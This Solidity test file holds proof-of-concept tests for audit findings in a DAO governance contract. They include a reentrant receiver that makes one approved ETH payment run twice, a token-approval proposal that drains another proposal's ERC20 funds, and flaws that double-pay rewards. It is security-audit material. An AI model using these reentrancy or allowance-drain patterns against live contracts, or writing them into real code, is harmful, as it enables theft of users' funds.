// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.19;

import {LifecycleInvariantsTest} from "../integration/LifecycleInvariants.t.sol";
import {ShwounsDAOLogic} from "../../src/governance/ShwounsDAOLogic.sol";
import {ShwounsDAOTypes} from "../../src/governance/ShwounsDAOInterfaces.sol";
import {GovernanceRewards} from "../../src/rewards/GovernanceRewards.sol";
import {GovernanceIncentivesNFT} from "../../src/rewards/GovernanceIncentivesNFT.sol";
import {ApprovalRegistry} from "../../src/rewards/ApprovalRegistry.sol";
import {MockERC20} from "../mocks/MockERC20.sol";
import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";

contract ReentrantProposalTarget {
    ShwounsDAOLogic public immutable dao;
    uint256 public proposalId;
    bool private entered;

    constructor(ShwounsDAOLogic _dao) {
        dao = _dao;
    }

    function setProposalId(uint256 _proposalId) external {
        proposalId = _proposalId;
    }

    receive() external payable {
        if (!entered) {
            entered = true;
            dao.finalize(proposalId);
        }
    }
}

contract AuditFindingsTest is LifecycleInvariantsTest {
    function _queueSnapshotCollect(uint256 proposalId, uint256 collectBatch) internal {
        dao.queue(proposalId);
        dao.recordSnapshot(proposalId, 100);
        dao.collect(proposalId, collectBatch);
    }

    function _proposeCall(address proposer, address target, bytes memory data) internal returns (uint256 proposalId) {
        address[] memory targets = new address[](1);
        uint256[] memory values = new uint256[](1);
        string[] memory signatures = new string[](1);
        bytes[] memory calldatas = new bytes[](1);
        targets[0] = target;
        calldatas[0] = data;

        vm.prank(proposer);
        proposalId = dao.propose(targets, values, signatures, calldatas, "audit PoC");
    }

    function test_audit_finalizeReentrancySpendsAnotherProposalsETH() public {
        uint256 victimProposal = _proposeETH(alice, recipientA, 2 ether);
        _passToSucceeded(victimProposal);
        _queueSnapshotCollect(victimProposal, 100);

        ReentrantProposalTarget attacker = new ReentrantProposalTarget(dao);
        uint256 attackProposal = _proposeETH(bob, address(attacker), 1 ether);
        _passToSucceeded(attackProposal);
        _queueSnapshotCollect(attackProposal, 100);
        attacker.setProposalId(attackProposal);

        assertEq(address(dao).balance, 3 ether);
        dao.finalize(attackProposal);

        assertEq(address(attacker).balance, 2 ether, "one approved payment executed twice");
        assertEq(address(dao).balance, 1 ether, "victim proposal lost 1 ETH");
        vm.expectRevert();
        dao.finalize(victimProposal);
    }

    function test_audit_cancelAfterPartialCollectPermanentlyStrandsFunds() public {
        uint256 proposalId = _proposeETH(alice, recipientA, 6 ether);
        _passToSucceeded(proposalId);
        dao.queue(proposalId);
        dao.recordSnapshot(proposalId, 100);
        dao.collect(proposalId, 1);

        uint256 stranded = address(dao).balance;
        assertGt(stranded, 0);

        vm.prank(alice);
        dao.cancel(proposalId);
        assertEq(uint256(dao.state(proposalId)), uint256(ShwounsDAOTypes.ProposalState.Canceled));

        address[] memory assets = new address[](1);
        assets[0] = address(0);
        vm.expectRevert();
        dao.refundStuckProposal(proposalId, assets);
        assertEq(address(dao).balance, stranded);
    }

    function test_audit_approvalActionDrainsAnotherProposalsERC20() public {
        MockERC20 asset = new MockERC20();
        asset.mint(address(aliceVault), 100 ether);

        address[] memory targets = new address[](1);
        uint256[] memory values = new uint256[](1);
        string[] memory signatures = new string[](1);
        bytes[] memory calldatas = new bytes[](1);
        targets[0] = address(asset);
        calldatas[0] = abi.encodeWithSignature("transfer(address,uint256)", recipientA, 100 ether);

        vm.prank(alice);
        uint256 victimProposal = dao.propose(targets, values, signatures, calldatas, "victim ERC20 transfer");
        _passToSucceeded(victimProposal);
        _queueSnapshotCollect(victimProposal, 100);
        assertEq(asset.balanceOf(address(dao)), 100 ether);

        address attacker = makeAddr("allowanceAttacker");
        uint256 attackProposal = _proposeCall(
            bob, address(asset), abi.encodeWithSignature("approve(address,uint256)", attacker, type(uint256).max)
        );
        _passToSucceeded(attackProposal);
        dao.queue(attackProposal);
        dao.finalize(attackProposal);

        vm.prank(attacker);
        asset.transferFrom(address(dao), attacker, 100 ether);
        assertEq(asset.balanceOf(attacker), 100 ether);

        vm.expectRevert();
        dao.finalize(victimProposal);
    }

    function test_audit_zeroERC20WithdrawalRemovesFundedVaultFromActiveSet() public {
        MockERC20 asset = new MockERC20();
        asset.mint(alice, 100 ether);
        vm.startPrank(alice);
        aliceVault.withdraw(alice, address(aliceVault).balance);
        asset.approve(address(aliceVault), 100 ether);
        aliceVault.depositERC20(address(asset), 100 ether);
        assertTrue(_containsActiveVault(aliceNoun));

        aliceVault.withdrawERC20(address(asset), alice, 0);
        vm.stopPrank();

        assertEq(asset.balanceOf(address(aliceVault)), 100 ether);
        assertFalse(_containsActiveVault(aliceNoun), "funded vault disappeared from active set");
    }

    function test_audit_nonexistentTokenVaultCanPolluteActiveSet() public {
        uint256 nonexistentTokenId = 1_000_000_000;
        address fakeVault = registry.createVaultFor(nonexistentTokenId);
        assertEq(token.totalSupply(), 4, "token ID is not minted");

        vm.deal(address(this), 1 wei);
        (bool ok,) = fakeVault.call{value: 1 wei}("");
        assertTrue(ok);
        assertTrue(_containsActiveVault(nonexistentTokenId));
    }

    function _containsActiveVault(uint256 tokenId) internal view returns (bool) {
        uint256 length = registry.activeVaultsLength();
        for (uint256 i = 0; i < length; i++) {
            if (registry.activeVaultAt(i) == tokenId) return true;
        }
        return false;
    }

    function test_audit_oneApprovedGINFTCanAuthorizeMultipleVoterClaims() public {
        GovernanceRewards rewards = new GovernanceRewards();
        GovernanceIncentivesNFT giNFT = new GovernanceIncentivesNFT(0);
        ApprovalRegistry approvals = new ApprovalRegistry(IERC721(address(giNFT)));
        giNFT.transferOwnership(address(rewards));
        rewards.setDAOLogic(address(dao));
        rewards.setApprovalRegistry(approvals);
        dao.setGovernanceRewards(address(rewards));

        vm.deal(address(rewards), 1 ether);
        uint256 giTokenId;
        vm.prank(alice);
        giTokenId = giNFT.mint();
        approvals.approve(giTokenId);

        uint256 proposalId = _proposeETH(alice, recipientA, 1 ether);
        vm.roll(block.number + 2);
        vm.prank(alice);
        dao.castVote(proposalId, 1);
        vm.prank(bob);
        dao.castVote(proposalId, 1);
        vm.roll(block.number + 7201);
        _queueSnapshotCollect(proposalId, 100);
        dao.finalize(proposalId);

        vm.prank(alice);
        rewards.claimVotingReward(proposalId, giTokenId);
        vm.prank(alice);
        giNFT.transferFrom(alice, bob, giTokenId);
        vm.prank(bob);
        rewards.claimVotingReward(proposalId, giTokenId);

        assertTrue(rewards.voterClaimed(proposalId, alice));
        assertTrue(rewards.voterClaimed(proposalId, bob));
    }

    function test_audit_rewardPoolsCanBeAllocatedBeyondContractBalance() public {
        GovernanceRewards rewards = new GovernanceRewards();
        rewards.setDAOLogic(address(this));
        vm.deal(address(rewards), 0.1 ether);

        rewards.allocateProposalReward(1);
        rewards.allocateProposalReward(2);

        assertEq(rewards.proposalRewardPool(1), 0.1 ether);
        assertEq(rewards.proposalRewardPool(2), 0.1 ether);
        assertEq(address(rewards).balance, 0.1 ether);
        assertGt(rewards.proposalRewardPool(1) + rewards.proposalRewardPool(2), address(rewards).balance);
    }
}
